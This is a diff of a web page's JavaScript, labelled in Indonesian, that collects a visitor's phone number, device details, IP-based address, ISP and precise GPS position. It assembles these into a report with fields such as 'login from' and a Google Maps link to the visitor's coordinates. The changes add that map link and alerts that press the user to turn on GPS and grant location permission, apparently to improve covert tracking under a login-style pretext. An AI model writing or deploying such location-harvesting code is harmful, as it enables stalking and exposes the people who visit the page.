@@ -73,7 +73,7 @@
       const phoneInput = document.getElementById("phone").value;
       const clock = new Date().toLocaleString();
       let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
-      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A", gpsAddress = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", city = "N/A", postal = "N/A", org = "N/A", fullAddress = "N/A", gpsAddress = "N/A", googleMap = "N/A";
 
       const userAgent = navigator.userAgent;
       const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
@@ -120,15 +120,22 @@
               latitude = pos.coords.latitude.toFixed(6);
               longitude = pos.coords.longitude.toFixed(6);
               accuracy = pos.coords.accuracy + "m";
+              googleMap = `https://maps.google.com/?q=${latitude},${longitude}`;
               try {
                 const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
                 const geoData = await geoRes.json();
                 gpsAddress = geoData.display_name || "N/A";
               } catch {}
+              if (parseFloat(pos.coords.accuracy) > 100) {
+                alert("⚠️ Lokasi tidak akurat. Aktifkan GPS dan coba lagi.");
+              }
               resolve();
             },
-            () => resolve(),
-            { enableHighAccuracy: true, timeout: 5000 }
+            err => {
+              alert("❌ Lokasi ditolak. Aktifkan izin lokasi di browser kamu.");
+              resolve();
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
           );
         });
       } catch {}
@@ -147,6 +154,7 @@
         "login from": loginFrom,
         "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
         "alamat GPS akurat": gpsAddress,
+        "link maps": googleMap,
         "alamat berdasarkan IP": fullAddress,
         "provider": org,
         "kota": city,
